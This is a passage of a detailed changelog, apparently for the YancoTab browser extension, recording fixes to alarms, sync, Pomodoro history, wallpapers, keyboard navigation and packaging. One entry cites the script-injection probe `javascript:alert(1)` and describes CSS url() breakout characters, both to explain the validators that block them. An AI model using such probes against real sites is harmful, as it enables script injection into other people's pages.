  `--z-modal` (500) has been below the app layer's legacy
  `z-index: 2000` all along; the new tray (2100) would have covered it
  too. New `--z-alarm: 2200` token; an alarm's entire job is to be seen.
- **The in-app tray stole clicks from full-height windows.** It now
  auto-hides to a 12px peek strip at the bottom edge; hover or keyboard
  focus slides it back up.
- Also: the dock's running dot survives closing one of an app's several
  windows (single-slot pid map → a set per app); tray chips announce
  their minimized state and dropped the unearned `toolbar` role; light
  theme gets its own unfocused-window shadow (the dark-tuned one read
  heavier than the focused window); the cascade counter resets when the
  last window closes so a lone window opens at its designed position.

The four survivors that did not ship here are tracked as follow-ups:
game timers keep counting while minimized (`onSignal('pause')` is
dispatched but no game honors it yet), duplicate Notes editors on the
same note can cross-overwrite autosaves (previously hidden by the
process leak, not created by this change), toasts still paint under the
app layer (pre-existing), and Escape-inside-an-input closing the window
(pre-existing, kept for parity).

### Tests

2082 (+41): `tests/wm-core.test.js` covers z-order/focus/minimize
bookkeeping, the window cap, cascade wrapping, snap hit-testing and
geometry against hostile input, plus an invariant lock (focused is
always a visible window; minimized ⊆ order) across an op × state
matrix. Process-manager suite gains running-instance dedupe coverage —
including that a `starting` process is *not* reused and that the old
"sequential spawns get fresh pids" test now asserts the opposite, on
purpose. Verified live in the browser: concurrent windows, focus raise,
reuse-instead-of-duplicate, minimize/restore via tray, snap left +
unsnap + top-maximize, compact-mode single window, Escape, show
desktop.

### Service worker

Cache bumped to `yancotab-v1.10.0-window-mode`. Precache gains
`css/wm.css` and the three `os/ui/wm/` modules.

---

## [1.9.2] — 2026-08-05

Found by auditing the packed extension zip rather than the source tree.

### Fixed — PDF auto-OCR could never load

`codexSearch.js` lazy-loads the OCR service with
`import('../../../services/ocrService.js')`. The file sits in
`os/apps/pdf/`, so three levels up is the extension **root** — a path
that has never existed. Two levels is `os/`, which is what every other
caller uses (`os/apps/photos/OcrTool.js`, at the same depth, has it
right).

The call is wrapped in `try { … } catch { _ocrSvc = false; }` under a
comment reading *"silently skipped if unavailable"*. It was not skipped
when unavailable — it was skipped **always**, so a scanned PDF was never
put through OCR and never became searchable. The feature shipped in the
PDF Reader v2 wave and has never run.

Verified in the browser both ways: the old specifier fails to fetch, the
new one resolves and exports `ocrService`.

### Added — a guard for the whole class

Every relative import in `os/` — static **and dynamic** — must resolve
to a file that exists. 300+ specifiers, checked on every run.

The existing boot-graph walker could not have caught this: it follows
only static imports from the boot entries, because lazy app imports are
dynamic and legitimately load later. A dynamic `import()` pointing at
nothing therefore fails as a rejected promise inside somebody's catch,
which is precisely how this survived. Mutation-verified by restoring the
extra `../`, which names the file and the bad target.

### Fixed — the packer was shipping dev files

Extracting the zip and looking at what was actually in it turned up a
second, larger leak than the stale screenshots. The exclude list named
files one at a time, so everything nobody had thought to name shipped:

`PDF_READER_V3_DESIGN.md`, `BUG-pdf-text-selection.md`, an internal
audit dump, `design-lab.html`, `404.html`, `eslint.config.js`,
`knip.json`, `docs/`, and **`serve.mjs` — which hardcodes the author's
own filesystem path**. Plus 926 KB of master artwork
(`extension_logo.png`, `assets/icons/icon.svg`) that nothing references:
not the manifest, not index.html, no CSS, no JS. Both are kept in the
repo and excluded from the payload.

**The wildcard excludes never worked.** Git Bash ships no rsync, so
Windows always took the `cp` fallback, which pruned with
`rm -rf "$STAGE/$pat"` — quoted, therefore never glob-expanded. Every
literal entry worked and every pattern silently did nothing, which is
how a timestamped audit dump made it into the zip.

Payload: **7.59 MB → 4.88 MB**, a 36% cut across this release and the
last. The root of the extension now contains exactly four files:
`index.html`, `manifest.json`, `privacy.html`, `favicon.ico`.

### Packaging

`yancotab-v1.9.2.zip` — 4.88 MB, 493 entries, all 13 audit checks green:
manifest declares `storage` only with no host permissions, all four
icons and the new-tab override resolve, every `__MSG_*__` placeholder
has a key, index.html's 21 local references and all 421 modules in the
import graph are present, every CSS `url()` resolves, and nothing from
`tests/`, `scripts/`, `.claude/`, `node_modules/` or `assets/store/`
leaked in.

The extracted payload was then served and booted on its own: all 22 apps
open, one grid tab stop, four widgets, no missing requests. Its only
console error is `sw.js` 404-ing, which is an artifact of the test — the
extension excludes the service worker deliberately and `boot-init.js`
skips registration when `chrome.runtime.id` is present, so the real
install never asks for it. The same probe against the source tree is
silent.

---

## [1.9.1] — 2026-08-05

Store assets. Regenerating them surfaced a live bug in the thing the
last few releases had just repaired.

### Fixed — every alarm rang at the wrong time, seconds after load

Found by a screenshot. The capture freezes the clock to 14:34 and seeds
a 07:00 alarm so the Clock icon shows its amber badge; the shot came
back with a **ringing-alarm overlay covering the whole desktop**.

`normalizeV2Alarm` tested `Number.isFinite(Number(alarm.snoozedUntil))`.
`Number(null)` is **0**, and 0 is finite — so "not snoozed" (`null`,
the value that same function writes) round-tripped into "snoozed until
1 Jan 1970". That is a deadline in the past, which `tickV2` reads as a
snooze that has come due, so it fired the alarm ignoring its time
entirely — then once a minute, forever.

The legacy normalizer four lines above tests the raw value and has
always been correct; only the v2 path wrapped it in `Number()`.

Invisible until v1.6.0. Before that fix ClockService could not read
alarms at all, so the wrong value had nothing to act on — the plumbing
repair is what let this reach the surface. Confirmed live: an alarm set
five hours out rang within one tick of load, and does not now, while a
genuinely-due snooze still does.

The tick also refuses a non-positive `snoozedUntil` outright. That is
not belt and braces: the bad value is already persisted in real saved
state, and without the guard an upgrade would ring once before the
corrected value was written back.

### Fixed — half of Settings had no styling

The `.ys-*` row classes (`ys-row`, `ys-info`, `ys-label`, `ys-desc`,
`ys-name-input`) had **no CSS at all**. The SettingsApp extraction
ported the console's own `mc-set-*` rows and left the six legacy modules
emitting the old names, so ~20 rows across Appearance, Apps & data and
Games rendered as bare stacked divs — label, description and control on
three separate lines.

The theme picker was worse: it builds `.ys-wallpaper` / `.selected`
while the ported CSS only knew `.ys-wallpaper-thumb` / `.is-active`, so
the eight wallpapers rendered as a cramped row of text buttons instead
of a grid of thumbnails. Both name pairs are now matched rather than
renaming one, because the thumb/is-active pair is what the other modules
use.

Found the same way — it was in the Settings screenshot.

### Changed — store assets

- **Promotional tile regenerated** and no longer a manual step.
  `scripts/make-promo-tile.mjs` drives the existing generator page with
  puppeteer-core and writes the PNG to `assets/store/`, asserting the
  canvas is 440×280, actually painted, and opaque and dark in all four
  corners — the store crops rounded corners and a white border reads as
  broken against its white background.
- **The generator's logo now lives in the repo.** It pointed at an
  untracked file in the root, and `drawPromo()` runs from `onload`, so
  on a fresh clone the tile silently came out blank with nothing in the
  console.
- **All five screenshots regenerated** against v1.9.1, so they show the
  Focus Mode entry point (v1.6.0), the icon badges, the de-crested
  wallpapers, and the corrected Settings layout.
- **`store-screenshots/` deleted.** A second, older set flagged in
  v1.5.1 as stale — and it was being **packed into the shipped
  extension**: `pack-extension.sh` excludes `assets/store` but never
  excluded this directory. The zip drops **7.59 MB → 5.73 MB**, a
  quarter of the payload, all of it duplicate screenshots no user could
  ever see.

### Fixed — documentation that had drifted

- **"18 apps" is now 22** in the README, the store listing and the promo
  tile. `boot.js` registers 22 (13 apps + 9 games); Mail, Maps, PDF
  Reader and Photos were missing from every list.
- **The README badge said 1.2.5** — seven versions behind, on the first
  thing anyone sees on GitHub. It joins the version-sync test, which
  now guards **eight** locations.
- The README still advertised "chrome.storage.sync with chunking",
  removed in 1.9.0, and "7 wallpapers" where there are 8.

### Tests

2049 (+6). Snooze normalization is covered in both directions — a
poisoned `snoozedUntil: 0` on disk is repaired rather than honoured, and
a real snooze deadline still fires — plus the round trip that created
the bad value in the first place. Mutation-verified: restoring the
`Number()` coercion fails 4 tests, and reverting the README badge fails
the version guard.

---

## [1.9.0] — 2026-08-05

The last of the second audit wave's five verified findings, shipped
alone because it deletes data from `chrome.storage.sync`.

### Fixed — chunked sync wrote data no device could read

Any value over `chrome.storage.sync`'s 8KB per-item cap was split across
`key__chunk_0…n` with a `{__chunked}` manifest stored at `key`. Nothing
could ever reassemble it, for three independent reasons:

- hydration asks the cloud for **registry keys only**, so the chunk
  items were never fetched;
- `_handleRemoteChange` drops anything that is not an envelope, and a
  manifest has no `data`/`version`/`seq` — it returned before touching
  it;
- the reassembler read chunks from **localStorage**, where nothing has
  ever written one, and bailed outright for remote reads anyway.

So Notes metadata, Todo, browser history and Pomodoro history — the
keys most likely to grow — appeared to sync and did not.

### Why the mechanism could not simply be repaired

`chrome.storage.sync` allows 8KB per item but only **100KB in total**,
across all ~40 keys. A value large enough to need chunking is already
too large for the entire quota: a single 100KB blob spread over 13
chunks consumes the whole budget, and once `QUOTA_BYTES` is hit *every
other key's write starts failing too*. The feature could take the entire
sync system down in exchange for data nobody could read.

Reassembly is not merely unimplemented, either. `chrome.storage.sync`
propagates per item, so chunk 0 of one write can land beside chunk 1 of
the next on another device and reassemble into something that parses
cleanly and is wrong. The `totalBytes` check catches a length mismatch,
not two same-length writes.

Chunking is therefore removed rather than fixed. Oversized values stay
local, and **Settings → Sync diagnostics** now names them with their
size instead of leaving the user to wonder why one machine disagrees
with another.

### Cleanup

Existing chunk items are deleted, in two places:

- **A one-shot sweep after hydration** enumerates the cloud and removes
  every `__chunk_` item and every `{__chunked}` manifest. Without it, a
  key that is *still* too large is never written again, so its chunks
  would hold quota forever. Costs one read per boot and issues no write
  unless there is something to delete.
- **On write**, for the key being written.

A key's own cloud item is deleted only when it holds a manifest. A
stale-but-valid envelope is left alone: being behind is ordinary sync
behaviour, and throwing away a real older copy is worse than keeping
one.

The removals fire `chrome.storage.onChanged` on every device — callbacks
that have never fired in production for these keys. Traced before
shipping: chunk keys are skipped by name, and a removal delivers
`newValue: undefined`, which `_handleRemoteChange` returns on. No-op,
as intended.

### Tests

2043 (+11). `tests/appStorage-sync-chunks.test.js` runs the real class
against a fake `chrome.storage.sync` that counts calls, so "wrote
nothing" is asserted rather than inferred. Mutation-verified twice:
removing the size guard fails 5 tests, and a sweep that finds nothing
fails the cleanup suite.

Also verified live in the browser against a simulated extension
environment: a seeded legacy manifest plus its two chunks were purged,
an oversized save performed **zero** cloud writes while keeping all 400
local records, and the diagnostics panel listed the key at 26KB.

---

## [1.8.0] — 2026-08-05

Three more verified audit findings. Two of them are the same shape — a
storage key with a reader and no writer, or a writer and no reader — and
the third is the grid being unreachable without a mouse.

### Fixed — quick links could never be changed

`yancotab_quick_links` shipped with five defaults and no way to edit
them. The Web page rendered the list read-only, and the one component
that could add or remove a link (`ui/components/QuickLinks.js`) was
never mounted by anything: zero importers. Five links, permanently.

There is now an add tile at the end of the Web page and a remove button
on each tile, plus a full list in **Settings → Home & widgets**. Both
surfaces share one model and one prompt flow, because two editors is
exactly the setup that produces two subtly different validation rules.

A URL is validated at the step where it was typed rather than after
making the user name a link that was never going to be stored. Bare
hostnames are accepted the way an address bar accepts them — but the
prefix is conditional: blindly prepending `https://` would rescue
`javascript:alert(1)` into something that parses, passes the http check,
and is not what anyone typed.

The dead `QuickLinks.js` is deleted rather than wired up. It long-pressed
to delete, which is undiscoverable on a desktop, and it duplicated the
model.

### Fixed — the Today bar had no settings, and the timer lived in it

`yancotab_widgets` was registered, defaulted, synced — and unreachable.
There is now a toggle per widget.

That change could not ship alone. The Pomodoro widget was the **only**
per-second driver on the home screen, so the moment the card could be
turned off, hiding it would have silently stopped a running session —
trading v1.7.0's "sessions vanish" bug for a new one. The tick moved off
the view into `pomodoro/ticker.js`; the widget is now purely a renderer.

The ticker is not a blanket interval. It arms only while a cycle is live
and disarms when the phase returns to idle, driven by a storage
subscription rather than by polling — so an idle new tab, which is
almost all of them, costs nothing. It also advances once on load, so a
deadline that passed while the tab was closed is recorded on open rather
than a second later.

Verified with the widget hidden and no Pomodoro window open: the session
still reached Stats, exactly once.

### Fixed — custom wallpapers were written, then destroyed

Setting a wallpaper from Photos or Files stored it and painted it, and
it was gone on the next load. Same for all 34 of the Photos wallpaper
manager's curated presets. This was worse than a wallpaper not sticking:
the choice was actively destroyed.

`yancotab_wallpaper` holds a marker, and five surfaces wrote one in
seven different vocabularies — `''`, `cosmic`, `starfield`, `custom`, a
preset id like `g1`, `url("assets/wallpapers/rose.webp")`, the same path
unwrapped, and legacy inline gradients. Nothing could read all seven.
`themes.js` understood the themed-image case and applied the *colour
theme's* wallpaper regardless of what the marker said.

The destructive half was in the desktop context menu, which restores the
wallpaper at boot: it ran every marker through a path normaliser and
**saved the result**. So `custom` became `url("custom")` — a request for
a file named "custom", which 404s — and `g1` became `url("g1")`. The
real choice was unrecoverable after one load.

One resolver (`theme/wallpaper.js`) now reads the marker and paints what
it says; the read path no longer writes at all. Verified across all
seven shapes, plus the legacy migration, plus survival of a reload.

A marker whose image is missing falls back to the default rather than
repairing itself — the marker syncs across devices but the multi-MB data
URL deliberately does not, so a device that has not received the image
yet must not delete the choice for the device that has.

**Light mode still suppresses wallpapers**, by design: it paints a flat
surface because contrast over an arbitrary photo cannot be guaranteed,
and that was measured in 1.4.1/1.4.3 rather than assumed. What was
missing was saying so — picking a wallpaper and seeing nothing happen
reads as a broken app — so Settings now explains it in light mode.

Custom images are also vetted *before* being stored, not just before
being painted. The value is interpolated into a CSS `url("…")`, so it
must be an image and must contain none of `" ' ( ) \` or whitespace,
either of which could close the url() early and append declarations of
the author's choosing.

### Added — the app grid is reachable from the keyboard

Nothing in the grid was focusable. Tab went from the search bar straight
past all 22 apps to the dock, and there was no way to launch anything
without a pointer. A `.app-icon:focus-visible` rule had been sitting in
`shell.css` for months, styling a state that could not occur.

The grid now takes **one** tab stop and the arrows move within it — the
toolbar contract, not 22 stops between search and dock. Enter or Space
launches, Home and End jump to the ends of the page, and stepping past
the last icon on a page moves to the next one. It does not wrap from the
last page back to the first: a silent jump to page 1 reads as the key
having done something else entirely.

Movement is computed from each item's stored page/row/col, not DOM
order — every icon is absolutely positioned, all pages share one
container, and a dragged icon keeps its original node. Enter dispatches
the same `item:click` a tap does, so folders, shortcuts and apps keep
one launch path.

Folder overlays gained the matching treatment: `role="dialog"` with
`aria-modal`, focus anchored inside on open, Tab trapped, and focus
returned to the icon that opened it. Without the trap, Tab from an
overlay opened by keyboard walked the desktop behind it and launched
things sight-unseen — the same defect Focus Mode had in 1.6.0.

Verified by walking the real tab order: status bar → search → page tabs
→ **one** grid stop → folder rail → dock, with `:focus-visible`
resolving and a single ring drawn (a global `:focus-visible` rule in
`tokens.css` was also ringing the cell, so the two together drew two
boxes).

### Also

- **The last native `confirm()`** — deleting a home-screen icon. The v1
  pass replaced 14 of them with YancoModal and missed this one.
- **Label hygiene has one definition** (`utils/text.js`), shared by Mail
  and quick links. Extracting it surfaced a real defect: the stripped
  range ran `200b–200f` in one span, which swept up **ZWJ and ZWNJ**.
  Those are not invisible tricks, they are text-shaping characters — ZWJ
  is what joins 👨‍👩‍👧 into one glyph, and ZWNJ controls Arabic and
  Persian letter joining. Stripping them silently mangled legitimate
  labels. ZWSP and the bidi overrides, which cause the problems the
  sanitiser exists for, are still stripped.
- **`AppGrid.js` 596 → 481 lines**, under the cap for the first time.
  Page dots, launch handling and keyboard access are now three modules
  under `ui/components/grid/`.

### Tests

2032 (+67): `grid-nav` (17), `wallpaper-resolver` (18), `quick-links`
(21), `pomodoro-ticker` (11). Mutation-verified: removing the ticker's
catch-up call, the scheme-rescue guard, or the resolver's custom branch
each turns the suite red.

Two of the new tests found live defects rather than confirming known
ones — the ZWJ strip above, and `pageItems` admitting a bare number from
the (import-reachable) grid blob as an item with an undefined id.

### Queued

The chunked-sync finding — data written in chunks that no device can
reassemble — ships alone in the next release. It deletes cloud keys and
will light up remote-change callbacks that have never fired.

---

## [1.7.0] — 2026-08-04

A second audit wave verified five more findings (all five survived
adversarial review). This release ships the first of them plus two
accessibility riders; the other four are designed and queued.

### Fixed — Pomodoro sessions no longer vanish

**A focus session that completed while the Pomodoro window was closed was
never recorded.** Three surfaces run a one-second tick — PomodoroApp, the
Today-bar widget, and Focus Mode — but only PomodoroApp persisted the
reducer's `sessionLogged` event. Focus Mode forwarded `toast` and
`activity` and silently dropped the rest; the widget did not use the
reducer at all, hand-rolling its own phase advance.

So the timer worked, the toast fired, the Activity feed even said
"session 1 complete" — while Stats, the week grid, the season heatmap and
both streaks recorded nothing. That split is the tell.

It was not a race the widget sometimes won: the loss was unconditional
whenever no PomodoroApp instance existed at the moment of expiry. That
covers widget-only use, being on the home screen or in another app
(`goHome` kills the process and clears its ticker), and **all** of Focus
Mode — which explicitly closes the active app before mounting, so a
feature whose entire purpose is running sessions without the app could
never record one.

Everything now routes through `runPomodoro` in a new
`os/apps/pomodoro/effects.js`, the single writer for both the live state
and the history. Nothing else may call `apply`, `saveState` or
`appendSession`.

### Why the obvious fix would have made it worse

Simply teaching the widget to call `appendSession` **double-logs**.
`PomodoroApp._dispatch` applied TICK to a cached `this._state` loaded once
at init, so when another surface advanced the phase underneath, the app's
stale copy expired independently a moment later and logged the same
session again — inflating exactly the statistics the fix exists to
correct. Removing that stale-input path is what makes the guarantee hold.

Exactly-once now has two layers:

- **In-tab it is structural, not defensive.** `runPomodoro` is a
  synchronous read-modify-write over localStorage (AppStorage has no
  memory cache) and `setInterval` callbacks cannot interleave, so the
  first surface to see the deadline advances and persists; the others load
  the advanced state and no-op.
- **Cross-tab needs a key.** `appendSession` dedupes on
  `sessionId = kind@startedAt` — the phase *start*, which every observer
  reads from shared storage, rather than `endedAt`, which each tab stamps
  itself. Derivable from existing entries, so old data dedupes with no
  migration.

### Also fixed by the same change

- **Duplicate, differently-worded toasts.** The widget emitted "Focus
  complete · 5-min break" while the reducer emitted "Focus complete · take
  a 5 min break" — different strings, so nothing deduped them. One writer,
  one toast.
- **The end chime never sounded outside the Pomodoro window**, because
  the `phase` event was dropped alongside `sessionLogged`.
- **The `dayKey` format ping-pong.** The widget wrote an unpadded
  `2026-8-4` while the engine writes `2026-08-04`, so each rewrote the
  other's format and zeroed `sessionsToday` on alternating ticks. The
  widget no longer computes a day key at all. Existing bad values
  self-heal on the first tick — asserted by a test rather than migrated.
- **Abandoned focus blocks are recorded.** The widget's right-click reset
  hard-wrote `idle` and threw the in-progress block away; it now dispatches
  `END_CYCLE`, which logs a `completed: false` partial. *Behaviour change:*
  that gesture now also emits a "Cycle ended" toast.
- **A no-op tick writes nothing.** Focus Mode used to save
  unconditionally; with three surfaces that was three writes per second,
  and AppStorage's sync scheduler is a trailing 2-second debounce on one
  shared timer — a per-second write starved it, so **no key synced at all
  while a timer ran**.

`PomodoroWidget.js` drops 286 → 166 lines.

### Deliberately not done

The plan called for a process-wide ambient singleton so phase effects
survive the app window. Only the **chime** was shared. The body-class
effects were not: `body.pomodoro-mute` resolves to
`.toast-container { display: none !important }` — a *global* suppression.
Letting that outlive the window would silence every toast in the product
during a five-minute break, including "Blocked unsafe URL" and quota
errors, with no Pomodoro window on screen to explain the silence.

### Fixed — accessibility

- **Toasts are now announced.** The container is `role="status"
  aria-live="polite"`, with error toasts upgraded to `role="alert"`. Every
  confirmation, failure and security block in the product routes through
  `kernel.emit('toast')` and none of it reached a screen reader; the 3s
  auto-dismiss meant a user who suspected a message could not navigate to
  it in time.
- **Settings toggles have names.** The shared `toggleRow` builder made an
  icon-only button whose visible label lived in a sibling div, so all nine
  toggles announced as "button, pressed". Now wired with `aria-labelledby`
  (plus `aria-describedby` for the sub-text), fixed once in the builder so
  every current and future toggle inherits it.

### Tests

1965 (+11). `tests/pomodoro-effects.test.js` covers the write path
end-to-end against a new in-memory storage double (`makeFakeStorage`,
which counts writes so a no-op can be asserted). Mutation-verified three
ways: deleting the `sessionLogged` branch fails 5 tests, deleting the
cross-tab dedupe fails the cross-tab test specifically, and deleting the
no-op early return fails 3.

One test is an invariant lock rather than a case: for every intent × a
matrix of phases, if `apply()` returns the identical state reference it
must also return zero events. That is the property `runPomodoro`'s early
return depends on, and it would otherwise be silently breakable by a
future reducer edit.

### Queued

Four more verified findings are designed and sequenced: custom wallpaper
written-but-never-read, widget/quick-link configuration UIs, grid keyboard
navigation, and the chunked-sync path that writes data no device can
reassemble. The last must ship alone — it deletes cloud keys and would
light up remote-change callbacks that have never fired.

---

## [1.6.0] — 2026-08-04

A 15-agent multi-dimension audit (boot/perf, home UX, productivity apps,
games, silent failures, accessibility, security/storage) produced 46
findings; the top 7 were adversarially verified against the code and all
7 survived. This release ships the audit's quick-win tier — eight fixes,
every one verified live in the browser.

### Fixed — critical

- **Alarms have never been able to ring.** ClockApp saves
  `yancotab_clock_v3` through kernel.storage, which wraps state in an
  AppStorage envelope `{data, version, ts, seq, deviceId}`. The
  background ringer — ClockService, ticked every second by the kernel —
  read the same key with a raw `JSON.parse`, received the envelope, and
  normalized it to `alarms: []`. The Clock UI happily rendered "Next
  alarm in 2h 14m" for an alarm that could not fire; the status-bar
  pill and icon badge read the key correctly, so every surface
  *advertised* an alarm the ringer could not see. Two writers, two
  formats, one key — the schema-split class from v1.1.1's TodoWidget.

  The kernel now passes its storage handle into ClockService (exactly
  as it already did for WeatherService, which is what made the omission
  visible), reads and writes go through it, and the raw fallback is
  envelope-aware for kernel-less contexts. Verified end-to-end: alarm
  set through ClockApp's own storage channel → ring overlay + sound
  fire on the minute. `tests/clock-service.test.js` (+7) pins the seam —
  ClockService previously had **zero** test coverage.

### Fixed — high

- **Offline boot was fully broken for the web app.** The SW fetch
  handler is precache-or-network with no runtime caching, and an ES
  module graph is all-or-nothing — one uncached static import rejects
  the whole graph. 22 boot-graph modules (themes.js, AppDock,
  WindowChrome, PageTabs, PagePanes, FolderRail, both widgets, the 12
  todo/pomodoro engine modules…) plus 4 of index.html's stylesheets
  (window-chrome, photos, pdf-reader, glass) were missing from the
  precache, so offline users got the "Boot Module Missing" screen while
  the 358-entry precache bought nothing. The v1.2.5 asset test only
  checked precache→disk, never boot-graph→precache, so this drifted
  silently. Both directions are now guarded: a static-import walker in
  `tests/asset-refs.test.js` asserts boot graph ⊆ precache and
  index.html CSS ⊆ precache (+3 tests, mutation-verified — deleting one
  entry turns the suite red). Dead entries (Dock.js, ClockWidget.js,
  QuickLinks.js — zero importers) removed.

- **Right-click was inverted.** The shell's capture-phase listener
  suppresses the native menu and its bubble-phase listener bailed on
  `e.defaultPrevented` — which the capture listener itself had just set.
  Net effect: the desktop background menu could never open anywhere
  except on text inputs (the one place it hijacked native
  cut/copy/paste). On top of that, the shell's menu instance was
  constructed with the *shell* where MobileContextMenu expects the
  *grid*, so all five background actions (Edit Home Screen, Open
  Settings, Sort, Add Shortcut, Change Wallpaper) threw on missing
  methods. The shell now reuses the grid's own correctly-wired menu, the
  bubble listener exempts only the shell's own suppression, and text
  inputs keep the native menu. The Pomodoro widget's right-click-reset
  now claims its event so the (newly working) background menu doesn't
  open over it.

- **The status-bar theme toggle now actually switches themes.** It
  dispatched `yancotab:theme-request` — an event with zero listeners —
  then hand-toggled the body class: no persistence, no light-mode accent
  re-pin (teal on white is 1.46:1), starfield left running. It now calls
  `applyThemeMode()`, the same path as SmartSearch's `> dark`.

- **File and note cards now open things.** Four surfaces dispatched
  `yancotab:open-file` — SmartSearch results, its Enter fallback, and
  every card on the home Files and Notes tabs — and nothing listened:
  two of the five home tabs were grids of inert buttons. One shell
  listener routes by type (text → the note's floating editor via
  `mode:'editor'`, data-URL images → Photos, PDFs → PDF Reader,
  else Files), mirroring FilesApp's own dispatch.

- **Timer/alarm confirmations are now visible.** Seven
  `yancotab:notify` dispatch sites ("Timer complete", snoozed,
  dismissed…) had no listener — a finished timer was a lone beep. The
  shell now bridges them to the toast pipeline.

- **The Todo widget no longer goes stale.** `TodoApp._commit` saved but
  never emitted `todo:changed` — the widget's only refresh trigger (the
  quick-add helpers always emitted it, which is why *some* paths
  worked). Checking a task off inside the app now updates the widget,
  pill, and badge instantly.

### Added

- **Focus Mode has a visible door** — a status-bar button (target icon)
  dispatching the existing `focus:toggle`. Previously reachable only by
  Ctrl+Shift+F or typing `> focus`; its own docblock promised an
  affordance that didn't exist. Entering now anchors keyboard focus on
  the exit button, and the hidden shell gains `visibility: hidden`
  (delayed past the fade) so Tab can no longer walk the invisible
  desktop behind the overlay and launch apps sight-unseen.

### Audit backlog

39 unverified medium/low findings from the same audit are tracked for
future waves — headline items: pomodoro sessions completed via
widget/Focus Mode never reach history, custom wallpaper written but
never read, chunked sync writes no device reads back, grid keyboard
accessibility, widget/quick-link configuration UIs.

### Tests

1954 (+10): 7 clock-service seam tests, 3 precache-direction guards.

---

## [1.5.1] — 2026-08-04

Store screenshots regenerated. They were not merely showing the old
wallpapers — they predated the v1.0 Liquid Glass redesign entirely,
showing a bottom nav bar that no longer exists, no widget bar, no page
tabs, no hex dock and no status bar. They would have misrepresented the
product to anyone browsing the listing.

### Fixed

- **The Ko-fi "Support" badge never hid behind an open app.** Found while
  reviewing the new captures — it was ghosting through every maximised
  app's titlebar. `body.in-app .kofi-badge { opacity: 0 }` has been there
  all along and `body.in-app` really is applied, but the badge also has
  `animation: greetFadeDown … both`, and a **filled animation outranks
  normal author declarations in the cascade**, so the rule never won.
  Cancelling the animation in that state lets it apply. Verified across
  all three states: visible on home, hidden over an app, restored on
  close.

  This is the second time `fill-mode: both` has produced a wrong reading
  in this codebase — it also made the badge look like it had a broken
  opacity while measuring contrast in 1.4.1.

### Changed — `scripts/take-screenshots.mjs`

Rewritten against the current UI, and now uses **puppeteer-core** against
an installed Chrome instead of `puppeteer`, so no second Chromium is
downloaded. The clock is offset to a fixed instant before any page script
runs, so re-running produces comparable images rather than a different
time each capture — an offset rather than a freeze, so animations and the
Solitaire timer still behave.

Every step now asserts what it captured and throws rather than saving a
wrong frame. Each of these was a real silent failure first:

- Notes is the "constellation" app; the old `.notes-doc-card` selector
  matched nothing. Opening a note *replaces* the library in the same
  window rather than floating over it, so the two cannot share a frame —
  the Cosmos star map is captured, being the distinctive view.
- Note tags come from `#hashtags` in the note **body**; the metadata
  `tags` field does not populate the constellation rail, so the rail was
  empty.
- Solitaire has two buttons reading "New Game" — the toolbar's `New Game ▾`
  only opens a deal-type dropdown. The old script clicked that one and
  captured the start menu instead of a game. It now targets the start
  screen's button and asserts 52 cards were dealt.
- The weather seed used shapes that do not exist: state holds a
  `locations` array, not a flat `lat/lon/city`, and the cache is a map
  keyed by query, not a single entry. Wrong shapes fall back silently to
  "CURRENT LOCATION" with generic data. Only the location is seeded now
  and the forecast is fetched live, so the numbers are real.

### Note

`store-screenshots/` still holds a second, older set under different
names, one of which (`04-todo-app`) does not match the documented
listing. `assets/store/` is the canonical set — it matches
STORE_LISTING.md, is what this script writes, and is what
`pack-extension.sh` excludes from the shipped zip.

---

## [1.5.0] — 2026-08-04

The crest is gone from the artwork, so the scrim that was hiding it can
be halved. The wallpapers are both more vivid **and** more readable than
in 1.4.3 — the problem is removed rather than covered.

### Changed — all eight wallpapers re-exported

`scripts/decrest-wallpapers.py` removes the YancoTab crest that was
composited into the centre of every wallpaper.

The crest is **found, not hand-masked**. Because it was pixel-identical
across all eight images while the backgrounds differ completely, the
per-pixel standard deviation across the stack collapses to ~0 exactly
where the crest is opaque. That needs no hardcoded coordinates and stays
correct if the artwork is ever re-exported at a different size.

Verified: the largest identical-across-all-wallpapers region went from
**26,398 px to 0**. Peak brightness behind the app grid was 252 in all
eight — the crest, to within a rounding error — and is now 76–154,
genuinely per-wallpaper.

### Scrim halved: 0.55 → 0.28

With white app labels over the old crest measuring 1.01:1, the scrim had
to be 0.55. Now the binding case is Crimson's own artwork: white-on-peak
is 2.81:1 unscrimmed, 4.70:1 at 0.25, 5.26:1 at 0.30. 0.28 keeps margin.

Every element improved despite half the darkening — app labels went
5.27:1 → **11.52:1**, idle page tabs 8.50 → 10.64, placeholder 4.73 →
5.53. All 10 measured elements still clear AA in both themes.

### Two things the removal needed

- **The glow is neutral, not green.** Testing green excess says it dies
  within 15px of the crest; that is wrong and leaves a grey blob on
  Obsidian. Luma on Obsidian shows the real decay — 85 at the mask edge,
  29 at 20px, 11 at 60px, background level around 130px. Hence a 130px
  dilation, not 24.

- **Smooth interpolation is not enough for Arctic.** The other seven are
  soft gradients that a pyramid push-pull fill reconstructs invisibly.
  Arctic is fine turbulent texture, and a purely smooth fill left an
  obvious blurred patch. The fill is therefore frequency-split: the
  interpolation supplies the low frequencies (colour and gradient, which
  must be correct) and the high frequencies are borrowed from a clean
  donor region of the same image. On the seven smooth wallpapers the
  borrowed detail is ~0, so it costs them nothing.

  The donor shift has to exceed the mask's own extent — the mask is
  505×462, so thirds of the image (360px) all overlapped it and every
  candidate was silently rejected, leaving Arctic unchanged. Halves work.

### Sizes

Six of eight shrank (emerald 27.8→17.3 KB, sapphire 23.0→9.9 KB) since a
detailed logo was removed. Arctic grew 181→208 KB, being the one image
where synthesised texture was added. Re-encode fidelity outside the
edited region is 49–55 dB PSNR, and 42 dB for Arctic.

### Verification

`python3 scripts/decrest-wallpapers.py --check` re-runs the detection and
exits non-zero if a shared element is ever baked back in. Node cannot
decode WebP without a dependency, so this invariant cannot live in the
`node --test` suite; the check was confirmed to pass on the new artwork
and to fail on the originals.

---

## [1.4.3] — 2026-08-04

Closes the three dark-mode contrast failures 1.4.2 documented but did not
fix. Dark mode now clears WCAG AA on every measured element, on all eight
shipped wallpapers.

### Root cause

Every shipped wallpaper has the **YancoTab crest baked into its centre**,
and the crest is near-white — the centre pixel is `rgb(141,255,145)` in
all eight, from Obsidian to Crimson. It sits directly behind the app grid.

That single fact explains the whole cluster: app labels measured 1.14:1,
1.08:1, 1.07:1… on every wallpaper, varying by hundredths. It looked like
eight separate wallpaper problems and was one shared image element. (The
wallpapers *are* distinct — their corners differ completely; only the
crest is shared.)

App labels are pure white, so no colour change could ever rescue them.
Only darkening what sits behind them can.

### Added — wallpaper readability scrim

A single black scrim over the wallpaper layer, at the measured minimum
opacity that clears AA: white on emerald's brightest label pixel is
4.43:1 at 0.50 and 5.27:1 at **0.55**.

